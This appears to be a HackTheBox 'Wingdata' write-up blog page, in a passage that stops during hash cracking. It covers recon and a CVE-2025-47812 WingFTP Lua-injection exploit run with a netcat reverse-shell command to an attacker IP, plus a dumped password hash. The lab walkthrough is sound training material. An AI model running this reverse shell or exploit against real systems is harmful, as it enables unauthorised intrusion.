@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox: Wingdata">
+<meta property="og:url" content="https://rivers.sh/posts/htb-wingdata/index.html">
+<meta property="og:site_name" content="River">
+<meta property="og:description" content="exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/wingdata/Pasted%20image%2020260320021553.png">
+<meta property="og:image" content="https://rivers.sh/images/wingdata/Pasted%20image%2020260321171506.png">
+<meta property="og:image" content="https://rivers.sh/images/wingdata/tony-sopranos-with-piocosta-5vut49gvwx03txs5.gif">
+<meta property="article:published_time" content="2026-03-20T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-21T21:30:32.051Z">
+<meta property="article:author" content="River">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Easy">
+<meta property="article:tag" content="WingFTP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rivers.sh/images/wingdata/Pasted%20image%2020260320021553.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox: Wingdata</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="River" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/htb-pterodactyl/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/htb-wingdata/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/htb-wingdata/&text=HackTheBox: Wingdata"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/htb-wingdata/&is_video=false&description=HackTheBox: Wingdata"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox: Wingdata&body=Check out this article: https://rivers.sh/posts/htb-wingdata/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/htb-wingdata/&name=HackTheBox: Wingdata&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/htb-wingdata/&t=HackTheBox: Wingdata"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#reconnaisance"><span class="toc-number">1.</span> <span class="toc-text">reconnaisance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-47812-for-foothold"><span class="toc-number">2.</span> <span class="toc-text">CVE-2025-47812 for foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tldr"><span class="toc-number">2.1.</span> <span class="toc-text">tldr:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce-revshell"><span class="toc-number">2.2.</span> <span class="toc-text">rce-&gt;revshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#own-wacky"><span class="toc-number">3.</span> <span class="toc-text">own wacky</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cracking-wacky%E2%80%99s-password"><span class="toc-number">4.</span> <span class="toc-text">cracking wacky’s password</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#privesc-methodology-fails"><span class="toc-number">5.</span> <span class="toc-text">privesc methodology &amp; fails</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-4138-why-manual-code-auditing-wins"><span class="toc-number">6.</span> <span class="toc-text">CVE-2025-4138; why manual code auditing wins</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox: Wingdata
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">River</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-20T04:00:00.000Z" class="dt-published" itemprop="datePublished">2026-03-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/HTB/">HTB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Easy/" rel="tag">Easy</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/WingFTP/" rel="tag">WingFTP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="reconnaisance"><a href="#reconnaisance" class="headerlink" title="reconnaisance"></a>reconnaisance</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sC -sV 10.129.6.216</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-20 02:03 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wingdata.htb (10.129.6.216)</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)</span><br><span class="line">|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.66</span><br><span class="line">|_http-title: WingData Solutions</span><br><span class="line">|_http-server-header: Apache/2.4.66 (Debian)</span><br><span class="line">Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.33 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(river㉿marcialwin11)-[~/htb/wingdata]</span><br><span class="line">└─$ ffuf -u http://wingdata.htb -H <span class="string">&#x27;Host: FUZZ.wingdata.htb&#x27;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -<span class="built_in">fc</span> 301</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://wingdata.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.wingdata.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 301</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 50ms]</span></span><br><span class="line"><span class="string">:: Progress: [4989/4989] :: Job [1/1] :: 934 req/sec :: Duration: [0:00:05] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/wingdata/Pasted%20image%2020260320021553.png" alt="wingftp version disclosure"><br>wingftp with version disclosure</p>
+<h1 id="CVE-2025-47812-for-foothold"><a href="#CVE-2025-47812-for-foothold" class="headerlink" title="CVE-2025-47812 for foothold"></a>CVE-<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812">2025-47812</a> for foothold</h1><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr:"></a>tldr:</h2><p>This vulnerability arises from improper handling of NULL bytes in the <code>&#39;username&#39;</code><br>parameter during login, leading to Lua code injection into session files. These maliciously crafted session files are subsequently executed when authenticated functionalities (e.g., <code>/dir.html</code>) are accessed, resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows). The exploit leverages a discrepancy between the string processing in <code>c_CheckUser()</code> (which truncates at NULL) and the session creation logic (which uses the full unsanitized username).</p>
+<h2 id="rce-revshell"><a href="#rce-revshell" class="headerlink" title="rce-&gt;revshell"></a>rce-&gt;revshell</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 poc.py -u http://ftp.wingdata.htb -c <span class="string">&quot;nc 10.10.15.90 4444 -e /bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">[*] Testing target: http://ftp.wingdata.htb</span><br><span class="line">[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with <span class="built_in">command</span>: <span class="string">&#x27;nc 10.10.15.90 4444 -e /bin/sh&#x27;</span> and username: <span class="string">&#x27;anonymous&#x27;</span></span><br><span class="line">[+] UID extracted: b6ce6368025bd4dddef232c031238ce4f528764d624db129b32c21fbca0cb8d6</span><br><span class="line">[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: b6ce6368025bd4dddef232c031238ce4f528764d624db129b32c21fbca0cb8d6</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<h1 id="own-wacky"><a href="#own-wacky" class="headerlink" title="own wacky"></a>own wacky</h1><p>interesting directory:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/wftpserver/Data/1/users</span><br></pre></td></tr></table></figure>
+
+<p><code>ls</code> yields:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">anonymous.xml</span><br><span class="line">john.xml</span><br><span class="line">maria.xml</span><br><span class="line">steve.xml</span><br><span class="line">wacky.xml</span><br></pre></td></tr></table></figure>
+
+<p><code>wacky.xml</code> yields:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">cat wacky.xml</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">USER_ACCOUNTS</span> <span class="attr">Description</span>=<span class="string">&quot;Wing FTP Server User Accounts&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">USER</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">UserName</span>&gt;</span>wacky<span class="tag">&lt;/<span class="name">UserName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableAccount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnableAccount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnablePassword</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnablePassword</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Password</span>&gt;</span>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ProtocolType</span>&gt;</span>63<span class="tag">&lt;/<span class="name">ProtocolType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableExpire</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableExpire</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ExpireTime</span>&gt;</span>2025-12-02 12:02:46<span class="tag">&lt;/<span class="name">ExpireTime</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxDownloadSpeedPerSession</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxDownloadSpeedPerSession</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxUploadSpeedPerSession</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxUploadSpeedPerSession</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxDownloadSpeedPerUser</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxDownloadSpeedPerUser</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxUploadSpeedPerUser</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxUploadSpeedPerUser</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SessionNoCommandTimeOut</span>&gt;</span>5<span class="tag">&lt;/<span class="name">SessionNoCommandTimeOut</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SessionNoTransferTimeOut</span>&gt;</span>5<span class="tag">&lt;/<span class="name">SessionNoTransferTimeOut</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxConnection</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxConnection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ConnectionPerIp</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ConnectionPerIp</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PasswordLength</span>&gt;</span>0<span class="tag">&lt;/<span class="name">PasswordLength</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ShowHiddenFile</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ShowHiddenFile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CanChangePassword</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CanChangePassword</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CanSendMessageToServer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CanSendMessageToServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableSSHPublicKeyAuth</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableSSHPublicKeyAuth</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SSHPublicKeyPath</span>&gt;</span><span class="tag">&lt;/<span class="name">SSHPublicKeyPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SSHAuthMethod</span>&gt;</span>0<span class="tag">&lt;/<span class="name">SSHAuthMethod</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableWeblink</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnableWeblink</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableUplink</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnableUplink</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableTwoFactor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableTwoFactor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TwoFactorCode</span>&gt;</span><span class="tag">&lt;/<span class="name">TwoFactorCode</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ExtraInfo</span>&gt;</span><span class="tag">&lt;/<span class="name">ExtraInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CurrentCredit</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CurrentCredit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RatioDownload</span>&gt;</span>1<span class="tag">&lt;/<span class="name">RatioDownload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RatioUpload</span>&gt;</span>1<span class="tag">&lt;/<span class="name">RatioUpload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RatioCountMethod</span>&gt;</span>0<span class="tag">&lt;/<span class="name">RatioCountMethod</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableRatio</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableRatio</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxQuota</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxQuota</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CurrentQuota</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CurrentQuota</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableQuota</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableQuota</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesName</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesAddress</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesAddress</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesZipCode</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesZipCode</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesPhone</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesPhone</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesFax</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesFax</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesEmail</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesEmail</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">NotesMemo</span>&gt;</span><span class="tag">&lt;/<span class="name">NotesMemo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableUploadLimit</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableUploadLimit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CurLimitUploadSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CurLimitUploadSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxLimitUploadSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxLimitUploadSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableDownloadLimit</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableDownloadLimit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CurLimitDownloadLimit</span>&gt;</span>0<span class="tag">&lt;/<span class="name">CurLimitDownloadLimit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">MaxLimitDownloadLimit</span>&gt;</span>0<span class="tag">&lt;/<span class="name">MaxLimitDownloadLimit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LimitResetType</span>&gt;</span>0<span class="tag">&lt;/<span class="name">LimitResetType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LimitResetTime</span>&gt;</span>1762103089<span class="tag">&lt;/<span class="name">LimitResetTime</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TotalReceivedBytes</span>&gt;</span>0<span class="tag">&lt;/<span class="name">TotalReceivedBytes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TotalSentBytes</span>&gt;</span>0<span class="tag">&lt;/<span class="name">TotalSentBytes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LoginCount</span>&gt;</span>2<span class="tag">&lt;/<span class="name">LoginCount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">FileDownload</span>&gt;</span>0<span class="tag">&lt;/<span class="name">FileDownload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">FileUpload</span>&gt;</span>0<span class="tag">&lt;/<span class="name">FileUpload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">FailedDownload</span>&gt;</span>0<span class="tag">&lt;/<span class="name">FailedDownload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">FailedUpload</span>&gt;</span>0<span class="tag">&lt;/<span class="name">FailedUpload</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LastLoginIp</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">LastLoginIp</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LastLoginTime</span>&gt;</span>2025-11-02 12:28:52<span class="tag">&lt;/<span class="name">LastLoginTime</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EnableSchedule</span>&gt;</span>0<span class="tag">&lt;/<span class="name">EnableSchedule</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">USER</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">USER_ACCOUNTS</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>hardcoded password hash that we can crack !</p>
+<h1 id="cracking-wacky’s-password"><a href="#cracking-wacky’s-password" class="headerlink" title="cracking wacky’s password"></a>cracking wacky’s password</h1><p>banged my head against a wall for an hour, even switched from john to hashcat, still no luck</p>
+<p>eventually came to the realization that the password hash might be salted</p>
+<p>eventually ran this find + grep combo to try to find any salts:</p>
